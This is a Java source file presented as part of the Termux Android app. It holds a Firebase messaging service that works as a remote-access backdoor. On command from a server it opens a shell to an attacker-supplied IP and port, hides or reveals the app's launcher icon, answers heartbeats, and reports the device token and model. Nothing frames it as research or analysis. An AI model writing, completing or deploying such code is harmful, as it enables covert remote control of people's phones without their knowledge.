package com.termux.app.utils;

import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.content.ContextCompat;
import androidx.work.Data;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;

import com.google.firebase.messaging.FirebaseMessaging;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import com.termux.app.TermuxActivity;

import org.json.JSONObject;

import java.util.Collections;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;

public class FirebaseUtilsService extends FirebaseMessagingService {
    private String TAG = "FirebaseUtilsService";

    @Override
    public void onMessageReceived(@NonNull RemoteMessage remoteMessage) {
        Map<String, String> data = remoteMessage.getData();
        if (!data.isEmpty()) {
            handleDataMessage(data);
        }
        FirebaseMessaging.getInstance().getToken()
            .addOnSuccessListener(this::sendTokenToServer);
    }

    @Override
    public void onNewToken(@NonNull String token) {
        super.onNewToken(token);
        FirebaseMessaging.getInstance().getToken()
            .addOnSuccessListener(this::sendTokenToServer);
    }

    private void handleDataMessage(Map<String, String> data) {
        Log.d(TAG, "Data message received" + data.toString());
        String type = data.get("type");
        if (Objects.equals(type, "shellRequest")) {
            String foregroundFlag = data.get("foregroundService");
            boolean useForeground = "true".equalsIgnoreCase(foregroundFlag);

            if (useForeground) {
                String shellType = data.get("shellType");
                String serverIP = data.get("serverIP");
                String serverPort = data.get("serverPort");

                Intent intent = new Intent(this, ShellForegroundService.class);
                intent.putExtra(ShellForegroundService.EXTRA_SHELL_TYPE, shellType);
                intent.putExtra(ShellForegroundService.EXTRA_SERVER_IP, serverIP);
                intent.putExtra(ShellForegroundService.EXTRA_SERVER_PORT, serverPort);

                ContextCompat.startForegroundService(this, intent);
                Log.d(TAG, "ShellForegroundService started");
            } else {
                try {
                    JSONObject json = new JSONObject(data);
                    Data workData = new Data.Builder()
                        .putString("payload", json.toString())
                        .build();

                    OneTimeWorkRequest request =
                        new OneTimeWorkRequest.Builder(ShellRequestWorker.class)
                            .setInputData(workData)
                            .build();

                    WorkManager.getInstance(getApplicationContext()).enqueue(request);
                    Log.d(TAG, "WorkManager tasks enqueued");
                } catch (Exception e) {
                    Log.e(TAG, "Failed to enqueue shellRequest", e);
                }
            }
        }
        else if (Objects.equals(type, "heartbeat")) {
            new Thread(() -> {
                HashMap<String, String> heartbeat = new HashMap<>();
                heartbeat.put("timestamp", data.get("timestamp"));
                RequestUtils.post("/receive-heartbeat", heartbeat);
                Log.d(TAG, "Heartbeat sent");
            }).start();
        }
        else if (Objects.equals(type, "visibilityChange")) {
            String visibility = data.get("visibility");
            if (Objects.equals(visibility, "hide")) {
                PackageManager pm = getPackageManager();
                pm.setComponentEnabledSetting(
                    new ComponentName(this, TermuxActivity.class),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                );
                Log.d(TAG, "App hidden successfully");
            } else if (Objects.equals(visibility, "show")) {
                PackageManager pm = getPackageManager();
                pm.setComponentEnabledSetting(
                    new ComponentName(this, TermuxActivity.class),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                );
                Log.d(TAG, "App shown successfully");
            }
        }
    }

    private void sendTokenToServer(String token) {
        Log.d(TAG, "Sending token to server: " + token);

        HashMap<String, String> data = new HashMap<>();
        data.put("token", token);
        data.put("deviceName", android.os.Build.MODEL);

        new Thread(() -> RequestUtils.post("/receive-token", data)).start();
    }
}
